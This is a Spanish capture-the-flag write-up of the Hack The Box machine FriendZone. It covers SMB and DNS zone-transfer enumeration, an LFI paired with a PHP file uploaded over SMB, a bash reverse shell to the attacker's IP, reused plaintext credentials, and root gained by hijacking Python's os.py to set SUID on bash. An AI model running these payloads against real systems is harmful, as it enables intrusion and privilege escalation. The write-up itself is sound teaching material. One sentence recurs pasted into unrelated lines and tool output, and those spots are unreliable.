---
layout: single
title: FriendZone - Hack The Box
excerpt: "En este post vamos a estar haciendo la maquina FriendZone de la plataforma de Hackthebox una maquina muy bueno vamos a estar enumerando mediante SMB para encontrar credenciales esta maquina es mas de enumeración gracias a que haremos un zone transfer encontramos dominios los cuales 1 de ellos podremos subir archivos y mediante un LFI apuntar a esos archivos que subimos mediante SMB después migraremos a otro usuario gracias a que en un archivo sus credenciales estarán en texto claro para la escalada de privilegios haremos un Python Library Hijacking"
date: 2023-06-23
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-friendzone/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - SMB Enumeration
  - FTP Enumeration
  - Python Library Hijacking
  - Local File Inclusion (LFI)
  - Domain Zone Transfer
---

⮕ Maquina Linux

![](/assets/images/htb-writeup-friendzone/web19.png)

```bash
❯ ping -c 1 10.10.10.123
PING 10.10.10.123 (10.10.10.123) 56(84) bytes of data.
64 bytes from 10.10.10.123: icmp_seq=1 ttl=63 time=110 ms

--- 10.10.10.123 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 109.781/109.781/109.781/0.000 ms
❯ whichSystem.py 10.10.10.123

10.10.10.123 (ttl -> 63): Linux
```

## PortScan 

```bash
❯ nmap -sCV -p21,22,53,80,139,443,445 10.10.10.123 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-22 17:59 CST
Nmap scan report for 10.10.10.123
Host is up (0.12s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a96824bc971f1e54a58045e74cd9aaa0 (RSA)
|   256 e5440146ee7abb7ce91acb14999e2b8e (ECDSA)
|_  256 004e1a4f33e8a0de86a6e42a5f84612b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Friend Zone Escape software
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -1h00m01s, deviation: 1h43m54s, median: -2s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2023-06-23T03:00:03+03:00
| smb2-time: 
|   date: 2023-06-23T00:00:04
|_  start_date: N/A
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
```

```bash
❯ nmap --script=http-enum -p80 10.10.10.123 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-22 18:01 CST
Nmap scan report for 10.10.10.123
Host is up (0.11s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /wordpress/: Blog
|_  /robots.txt: Robots file
```

## Enumeracion

Buenos vemos muchos puertos abiertos así que tenemos mucho que enumerar

Vimos el puerto del servicio **FTP** abierto pero como tal **Nmap** no nos reporto que podemos conectarnos con el usuario **anonymous** entonces como tal no tenemos credenciales y no podemos ver nada

```bash
❯ ftp 10.10.10.123
Connected to 10.10.10.123.
220 (vsFTPd 3.0.3)
Name (10.10.10.123:miguel7): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> 
```

También vemos el puerto de **SMB** abierto así que podemos enumerar mediante eso también 

Tenemos permiso de escritura y lectura en el recurso **Development** y el el recurso **general** solo podemos leer

```bash
❯ smbmap -H 10.10.10.123
[+] Guest session   	IP: 10.10.10.123:445	Name: 10.10.10.123                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	Files                                             	NO ACCESS	FriendZone Samba Server Files /etc/Files
	general                                           	READ ONLY	FriendZone Samba Server Files
	Development                                       	READ, WRITE	FriendZone Samba Server Files
	IPC$                                              	NO ACCESS	IPC Service (FriendZone server (Samba, Ubuntu))
```

Si listamos que hay dentro de **general** hay un archivo que se llama **creds.txt** 

```bash
❯ smbmap -H 10.10.10.123 -r general
[+] Guest session   	IP: 10.10.10.123:445	Name: 10.10.10.123                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	general                                           	READ ONLY	
	.\general\*
	dr--r--r--                0 Wed Jan 16 14:10:51 2019	.
	dr--r--r--                0 Tue Sep 13 09:56:24 2022	..
	fr--r--r--               57 Tue Oct  9 18:52:42 2018	creds.txt
```

Vamos a dVemos un panel de login en el subdominio que empieza con **administrator** escargarlo

```bash
❯ smbmap -H 10.10.10.123 --download general/creds.txt
[+] Starting download: general\creds.txt (57 bytes)
[+] File output to: /home/miguel7/Hackthebox/FriendZone/nmap/10.10.10.123-general_creds.txt
```

Este es el contenido son credenciales 

```bash
❯ catn 10.10.10.123-general_creds.txt
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

Vamos a probarlas primero por el protocolo **FTP** pero son incorrectas

```bash
❯ ftp 10.10.10.123
Connected to 10.10.10.123.
220 (vsFTPd 3.0.3)
Name (10.10.10.123:miguel7): admin
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> 
```
Vemos un panel de login en el subdominio que empieza con **administrator** 
Ahora si probamos con **SMB** a un recurso vemos que nos deja

```bash
❯ smbclient //10.10.10.123/general -U admin%WORKWORKHhallelujah@#
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jan 16 14:10:51 2019
  ..                                  D        0  Tue Sep 13 09:56:24 2022
  creds.txt                           N       57  Tue Oct  9 18:52:42 2018

		3545824 blocks of size 1024. 1651008 blocks available
smb: \> 

```

No vemos nada en la ruta **Development** pero bueno podemos subir cosas pero de primeras vamos a ver la pagina web para ver si en alguna parte se suben los recursos

```bash
❯ smbclient //10.10.10.123/Development -U admin%WORKWORKHhallelujah@#
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jun 22 18:22:10 2023
  ..                                  D        0  Tue Sep 13 09:56:24 2022

		3545824 blocks of size 1024. 1651008 blocks available
smb: \> 
```

Estos son los servicios que corren el servicio **web**

```ruby
❯ whatweb http://10.10.10.123
http://10.10.10.123 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[iVemos un panel de login en el subdominio que empieza con **administrator** nfo@friendzoneportal.red], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.123], Title[Friend Zone Escape software]
```

Y bueno esta es la pagina web la parecer nos dicen que si hemos estado en la **friendzone**

![](/assets/images/htb-writeup-friendzone/web1.png)

Con el escaneo de **Nmap** que hicimos lanzando el **script** **http-enum** vimos algunas rutas vamos a ver si podemos verlas

Pues bueno nada interesante

![](/assets/images/htb-writeup-friendzone/web2.png)

En la ruta **robots.txt** vemos esto

```bash
❯ curl -s http://10.10.10.123/robots.txt
seriously ?!
```

Vamos aplicar **Fuzzing** para ver si encontramos algo diferente

```bash
❯ dirsearch -u http://10.10.10.123

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/10.10.10.123/_23-06-22_18-29-46.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-06-22_18-29-46.log

Target: http://10.10.10.123/

[18:29:47] Starting: 
[18:29:53] 403 -  298B  - /.ht_wsr.txt
[18:29:53] 403 -  301B  - /.htaccess.bak1
[18:29:53] 403 -  301B  - /.htaccess.orig
[18:29:53] 403 -  303B  - /.htaccess.sample
[18:29:53] 403 -  301B  - /.htaccess.save
[18:29:53] 403 -  302B  - /.htaccess_extra
[18:29:53] 403 -  301B  - /.htaccess_orig
[18:29:53] 403 -  299B  - /.htaccess_sc
[18:29:53] 403 -  299B  - /.htaccessBAK
[18:29:53] 403 -  299B  - /.htaccessOLD
[18:29:53] 403 -  300B  - /.htaccessOLD2
[18:29:53] 403 -  291B  - /.htm
[18:29:53] 403 -  292B  - /.html
[18:29:53] 403 -  301B  - /.htpasswd_test
[18:29:53] 403 -  297B  - /.htpasswds
[18:29:53] 403 -  298B  - /.httr-oauth
[18:29:55] 403 -  291B  - /.php
[18:30:38] 200 -  324B  - /index.html
[18:30:38] 200 -   11KB - /index.bak
[18:30:54] 200 -   13B  - /robots.txt
[18:30:55] 403 -  300B  - /server-status
[18:30:55] 403 -  301B  - /server-status/
[18:31:04] 200 -  747B  - /wordpress/

Task Completed
```

Lo único nuevo que vemos es que hay un **.bak** vamos a descargarlo (al buscar el recurso en la web te lo descarga)

![](/assets/images/htb-writeup-friendzone/web3.png)

Pero bueno al parecer es una pagina por defecto

```bash
❯ cat index.bak | html2text

[Ubuntu Logo]  Apache2 Ubuntu Default Page
It works!
This is the default welcome page used to test the correct operation of the
Apache2 server after installation on Ubuntu systems. It is based on the
equivalent page on Debian, from which the Ubuntu Apache packaging is derived.
If you can read this page, it means that the Apache HTTP server installed at
this site is working properly. You should replace this file (located at /var/
www/html/index.html) before continuing to operate your HTTP server.
If you are a normal user of this web site and don't know what this page is
about, this probably means that the site is currently unavailable due to
maintenance. If the problem persists, please contact the site's administrator.
Configuration Overview
Ubuntu's Apache2 default configuration is different from the upstream default
configuration, and split into several files optimized for interaction with
Ubuntu tools. The configuration system is fully documented in /usr/share/doc/
apache2/README.Debian.gz. Refer to this for the full documentation.
Documentation for the web server itself can be found by accessing the manual if
the apache2-doc package was installed on this server.
The configuration layout for an Apache2 web server installation on Ubuntu
systems is as follows:
/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
|-- sites-enabled
|       `-- *.conf
    * apache2.conf is the main configuration file. It puts the pieces together
      by including all remaining configuration files when starting up the web
      server.
    * ports.conf is always included from the main configuration file. It is
      used to determine the listening ports for incoming connections, and this
      file can be customized anytime.
    * Configuration files in the mods-enabled/, conf-enabled/ and sites-
      enabled/ directories contain particular configuration snippets which
      manage modules, global configuration fragments, or virtual host
      configurations, respectively.
    * They are activated by symlinking available configuration files from their
      respective *-available/ counterparts. These should be managed by using
      our helpers a2enmod, a2dismod, a2ensite, a2dissite, and a2enconf,
      a2disconf. See their respective man pages for detailed information.
    * The binary is called apache2. Due to the use of environment variables, in
      the default configuration, apache2 needs to be started/stopped with /etc/
      init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not
      work with the default configuration.
Document Roots
By default, Ubuntu does not allow access through the web browser to any file
apart of those located in /var/www, public_html directories (when enabled) and
/usr/share (for web applications). If your site is using a web document root
located elsewhere (such as in /srv) you may need to whitelist your document
root directory in /etc/apache2/apache2.conf.
The default Ubuntu document root is /var/www/html. You can make your own
virtual hosts under /var/www. This is different to previous releases which
provides better security out of the box.
Reporting Problems
Please use the ubuntu-bug tool to report bugs in the Apache2 package with
Ubuntu. However, check existing_bug_reports before reporting a new bug.
Please report bugs specific to modules (such as PHP and others) to respective
packages, not to the web server itself.
```

Cuando vimos la captura de **Nmap** vimos varios subdominios así que vamos agregarlos al **/etc/hosts** puede que nos sirvan de algo

```bash
❯ echo "10.10.10.123 friendzone.red friendzoneportal.red" | sudo tee -a /etc/hosts
10.10.10.123 friendzone.red friendzoneportal.red
```

Antes de enumerar ese puerto vamos a ver si podemos ver algo diferente en esos subdominios

Bueno esto nos indica que tenemos que ir al **gym** para salir de la **friendzone**

![](/assets/images/htb-writeup-friendzone/web4.png)

Vamos a ver el código fuente para ver si encontramos algo interesante

![](/assets/images/htb-writeup-friendzone/web5.png)

Si vamos a la ruta vemos esto que es interesante ese tipo **hash** es dinámico va cambiando cada que recargas la pagina

![](/assets/images/htb-writeup-friendzone/web6.png)

En el otro subdominio vemos esto 

![](/assets/images/htb-writeup-friendzone/web7.png)

# Zone-transfer

Bueno el puerto **53** esta abierto vamos a usar la herramienta **dig** para enumerar este servicio con esta herramienta podemos tramitar peticiones **DNS** <https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns>

Sabemos el dominio que es **friendzone.red**

```bash
❯ dig @10.10.10.123 friendzone.red

; <<>> DiG 9.18.12-1~bpo11+1-Debian <<>> @10.10.10.123 friendzone.red
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 4837
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 777619f2b10c3fc0f0db2beb6494f3b4304fc8a244b6f983 (good)
;; QUESTION SECTION:
;friendzone.red.			IN	A

;; ANSWER SECTION:
friendzone.red.		604800	IN	A	127.0.0.1

;; AUTHORITY SECTION:
friendzone.red.		604800	IN	NS	localhost.Vemos un panel de login en el subdominio que empieza con **administrator** 

;; ADDITIONAL SECTION:
localhost.		604800	IN	A	127.0.0.1
localhost.		604800	IN	AAAA	::1

;; Query time: 113 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (UDP)
;; WHEN: Thu Jun 22 19:21:56 CST 2023
;; MSG SIZE  rcvd: 154

```

Vamos a enumerar los name servers pero no vemos cosas interesantes 

```bash
❯ dig @10.10.10.123 friendzone.red ns

; <<>> DiG 9.18.12-1~bpo11+1-Debian <<>> @10.10.10.123 friendzone.red ns
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 9926
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: d8845f38b89a6943da5bed666494f3f050b4c37c519d2381 (good)
;; QUESTION SECTION:
;friendzone.red.			IN	NS

;; ANSWER SECTION:
friendzone.red.		604800	IN	NS	localhost.

;; ADDITIONAL SECTION:
localhost.		604800	IN	A	127.0.0.1
localhost.		604800	IN	AAAA	::1

;; Query time: 110 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (UDP)
;; WHEN: Thu Jun 22 19:22:56 CST 2023
;; MSG SIZE  rcvd: 138

```

Ahora vamos vamos a enumerar los servidores de correo pero nada

```bash
❯ dig @10.10.10.123 friendzone.red mx

; <<>> DiG 9.18.12-1~bpo11+1-Debian <<>> @10.10.10.123 friendzone.red mx
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 569
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 4eff7c1dced81066f987f1cd6494f440514a35423aff8ee8 (good)
;; QUESTION SECTION:
;friendzone.red.			IN	MX

;; AUTHORITY SECTION:
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800

;; Query time: 113 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (UDP)
;; WHEN: Thu Jun 22 19:24:16 CST 2023
;; MSG SIZE  rcvd: 121
```

Un ataque común es el de transferencia de zona que nos permite obtener múltiples subdominios asociados al dominio 

```bash
❯ dig @10.10.10.123 friendzone.red axfr

; <<>> DiG 9.18.12-1~bpo11+1-Debian <<>> @10.10.10.123 friendzone.red axfr
; (1 server found)
;; global options: +cmd
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.		604800	IN	AAAA	::1
friendzone.red.		604800	IN	NS	localhost.
friendzone.red.		604800	IN	A	127.0.0.1
administrator1.friendzone.red. 604800 IN A	127.0.0.1
hr.friendzone.red.	604800	IN	A	127.0.0.1
uploads.friendzone.red.	604800	IN	A	127.0.0.1
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 116 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Thu Jun 22 19:25:33 CST 2023
;; XFR size: 8 records (messages 1, bytes 289)
```

Vamos agregar los nuevos al **/etc/hosts**

```bash
❯ cat /etc/hosts | tail -n 1
10.10.10.123 friendzone.red friendzoneportal.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red
```

Vemos un panel de login en el subdominio que empieza con **administrator**

![](/assets/images/htb-writeup-friendzone/panel.png)

Este como tal no funciona

![](/assets/images/htb-writeup-friendzone/web9.png)

Y bueno podemos subir archivos eso parece 

![](/assets/images/htb-writeup-friendzone/web10.png)

Vamos a ver si con las credenciales que tenemos podemos autenticarnos en el panel de login 

Al darle a login esto pasa 

![](/assets/images/htb-writeup-friendzone/web11.png)

Vamos a ir ala dirección donde nos indican y esto es lo que vemos 

![](/assets/images/htb-writeup-friendzone/web12.png)

Y bueno nos están diciendo que falta parámetros vamos a ingresarlos y pasa esto 

![](/assets/images/htb-writeup-friendzone/web13.png)

La **url** ya se ve interesante y ademas nos están diciendo que están lidiando con un **developer** principiante así que si es principiante pues podemos indicar hacer un **LFI**  

Y bueno no pasa nada  

![](/assets/images/htb-writeup-friendzone/web14.png)

Lo mas probable es que le este metiendo la extensión **.php** al final si probamos diciéndole que nos muestre el **dashboard** ya que es **.php** sin decirle la **ruta** vemos que lo hace 

![](/assets/images/htb-writeup-friendzone/web15.png)

Bueno si nos ponemos a pensar mediante **SMB** podemos subir archivos en un recurso compartido a nivel de red ya que tenemos capacidad de escritura y lectura y como en la ruta `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=algo` le esta concatenando el **.php** podemos subir un archivo que contenga código en **php** para ver si lo interpreta y apuntaremos al archivo mediante el **LFI**  pero bueno la gran pregunta bajo que ruta lo sube bueno si revisamos con **smbmap** esto 

```bash
❯ smbmap -H 10.10.10.123
[+] Guest session   	IP: 10.10.10.123:445	Name: friendzone.red                                    
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	Files                                             	NO ACCESS	FriendZone Samba Server Files /etc/Files
	general                                           	READ ONLY	FriendZone Samba Server Files
	Development                                       	READ, WRITE	FriendZone Samba Server Files
	IPC$                                              	NO ACCESS	IPC Service (FriendZone server (Samba, Ubuntu))
```

Nos esta diciendo que la ruta **Files** esta bajo la ruta **/etc/Files** entonces lo mas probable es que también la ruta donde podemos escribir podremos ver lo que hay en **/etc/Development** así que vamos a hacer una prueba 

```bash
❯ touch xd.php
❯ nano xd.php
❯ catn xd.php
<?php
	system("whoami");
?>
```

Ahora lo subimos 

```bash
❯ smbclient //10.10.10.123/Development -U admin%WORKWORKHhallelujah@#
Try "help" to get a list of possible commands.
smb: \> put xd.php
putting file xd.php as \xd.php (0.1 kb/s) (average 0.1 kb/s)
smb: \> 
```

Y si verificamos funciona

![](/assets/images/htb-writeup-friendzone/web16.png)

## Shell as www-data 

Pues bueno ahora vamos a ganar acceso ala maquina 

```bash
❯ cat pwned.php
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: pwned.php
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php
   2   │         system("bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'");
   3   │ ?>
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Ahora lo subimos

```bash
smb: \> put pwned.php
putting file pwned.php as \pwned.php (0.2 kb/s) (average 0.1 kb/s)
smb: \> 
``` 

Nos podemos en escucha por el puerto indicado 

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Le damos al enter  

![](/assets/images/htb-writeup-friendzone/web17.png)

Y ganamos acceso

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.123] 40254
bash: cannot set terminal process group (904): Inappropriate ioctl for device
bash: no job control in this shell
www-data@FriendZone:/var/www/admin$ whoami
whoami
www-data
www-data@FriendZone:/var/www/admin$ 
```

Ahora hacemos un tratamiento de la **tty**

```bash
www-data@FriendZone:/var/www/admin$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@FriendZone:/var/www/admin$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
www-data@FriendZone:/var/www/admin$ export TERM=xterm
```

Hay un usuario llamado **friend**

```bash
www-data@FriendZone:/var/www/admin$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
friend:x:1000:1000:friend,,,:/home/friend:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
www-data@FriendZone:/var/www/admin$ 
```

## User flag 

```bash
www-data@FriendZone:/home/friend$ ls
user.txt
www-data@FriendZone:/home/friend$ cat user.txt 
9102cea1450c80c3b0184f111378cf14
www-data@FriendZone:/home/friend$ 
```

Bueno si nos vamos ala ruta **/var/www** vemos esto 

```bash
www-data@FriendZone:/var/www$ ls -la
total 36
drwxr-xr-x  8 root root 4096 Sep 13  2022 .
drwxr-xr-x 12 root root 4096 Sep 13  2022 ..
drwxr-xr-x  3 root root 4096 Sep 13  2022 admin
drwxr-xr-x  4 root root 4096 Sep 13  2022 friendzone
drwxr-xr-x  2 root root 4096 Sep 13  2022 friendzoneportal
drwxr-xr-x  2 root root 4096 Sep 13  2022 friendzoneportaladmin
drwxr-xr-x  3 root root 4096 Sep 13  2022 html
-rw-r--r--  1 root root  116 Oct  6  2018 mysql_data.conf
drwxr-xr-x  3 root root 4096 Sep 13  2022 uploads
www-data@FriendZone:/var/www$ 
```

Y si vemos el **mysql_data.conf** vemos esto 

```bash
www-data@FriendZone:/var/www$ cat mysql_data.conf 
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
www-data@FriendZone:/var/www$ 
```

Vemos las credenciales de **friend:Agpyu12!0.213$**

## Shell as friend 

Nos podemos conectar por **SSH**

```bash
❯ ssh friend@10.10.10.123
friend@10.10.10.123's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

You have mail.
Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3
friend@FriendZone:~$ 
```

## Escalada de privilegios

Bueno si buscamos por privilegios **SUID** vemos esto que nos es interesante de momento

```bash
friend@FriendZone:/$ find \-perm -4000 2>/dev/null
./bin/fusermount
./bin/umount
./bin/mount
./bin/su
./bin/ntfs-3g
./bin/ping
./usr/bin/passwd
./usr/bin/traceroute6.iputils
./usr/bin/newgrp
./usr/bin/sudo
./usr/bin/gpasswd
./usr/bin/chsh
./usr/bin/chfn
./usr/sbin/exim4
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
friend@FriendZone:/$ 
```

Aqui hay un **script** en **Python3** que esta incompleto lo que podemos hacer es subir el **Pspy** para ver si se esta ejecutando <https://github.com/DominicBreuker/pspy/releases>

```bash
friend@FriendZone:/dev/shm$ cat /opt/server_admin/reporter.py
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
friend@FriendZone:/dev/shm$ 


```

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.123 - - [23/Jun/2023 10:35:04] "GET /pspy64 HTTP/1.1" 200 -
```

```bash
friend@FriendZone:/dev/shm$ wget http://10.10.14.12:80/pspy64
--2023-06-23 19:35:04--  http://10.10.14.12/pspy64
Connecting to 10.10.14.12:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                          100%[=======================================================>]   2.96M  42.4KB/s    in 54s     

2023-06-23 19:35:58 (56.2 KB/s) - ‘pspy64’ saved [3104768/3104768]

friend@FriendZone:/dev/shm$ 

```

Ahora si ejecutamos el **script** vemos que efectivamente se esta ejecutando el **Script**

![](/assets/images/htb-writeup-friendzone/web18.png)

En el **script** lo único que esta haciendo es importando la librería **os** y 2 variables donde se almacenan 2 direcciones de correo las demás lineas están comentadas y por ultimo esta haciendo un print pero bueno como **root** esta ejecutando el **script** y como esta importando la librería **os** en **Python3** podemos usarla para ejecutar un comando a nivel de sistema podemos hacer un **Python Library Hijacking**

# Python Library Hijacking

Primero vamos a ver donde esta **os.py** esta dentro de **python2.7** y otro en **python3.6**

```bash
friend@FriendZone:/dev/shm$ locate os.py
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.py
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.pyc
/usr/lib/python2.7/encodings/palmos.py
/usr/lib/python2.7/encodings/palmos.pyc
/usr/lib/python3/dist-packages/LanguageSelector/macros.py
/usr/lib/python3.6/os.py
/usr/lib/python3.6/encodings/palmos.py
friend@FriendZone:/dev/shm$ 
```

Si vemos quien es el propietario es **root** y ademas tenemos capacidad de escritura así que podemos alterar lo que hay o almacenar otras cosas

```bash
friend@FriendZone:/dev/shm$ ls -l /usr/lib/ | grep "python2.7"
drwxrwxrwx 27 root root  16384 Sep 13  2022 python2.7
friend@FriendZone:/dev/shm$ 
```

Hay vemos el **os.py**

```bash
friend@FriendZone:/usr/lib/python2.7$ ls -l os.py
-rwxrwxrwx 1 root root 25910 Jan 15  2019 os.py
friend@FriendZone:/usr/lib/python2.7$ 
```

Vamos a alterar el contenido al final del **Script** le vamos a decir que mediante **system** ya que estamos en la librería **os** le asigne privilegios **SUID** ala bash para solo hacer un **bash -p** y estar como **root**

```bash
friend@FriendZone:/usr/lib/python2.7$ cat os.py | tail -n 1
system("chmod u+s /bin/bash")
friend@FriendZone:/usr/lib/python2.7$ 
```

Asta ahora la **bash** sigue igual 

```bash
friend@FriendZone:/usr/lib/python2.7$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
friend@FriendZone:/usr/lib/python2.7$ 
```

Vamos a esperar a que **root** ejecute la tarea y cuando se importe la librería **os.py** la **bash** sera vulnerable

Después de un momento se ejecuta la tarea 

```bash
friend@FriendZone:/usr/lib/python2.7$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
friend@FriendZone:/usr/lib/python2.7$ 
```

## Shell as root && root.txt 

```bash
friend@FriendZone:/usr/lib/python2.7$ bash -p
bash-4.4# cd /root
bash-4.4# cat root.txt 
6f8fcc773803f7762e546e281f01b232
bash-4.4# 
```
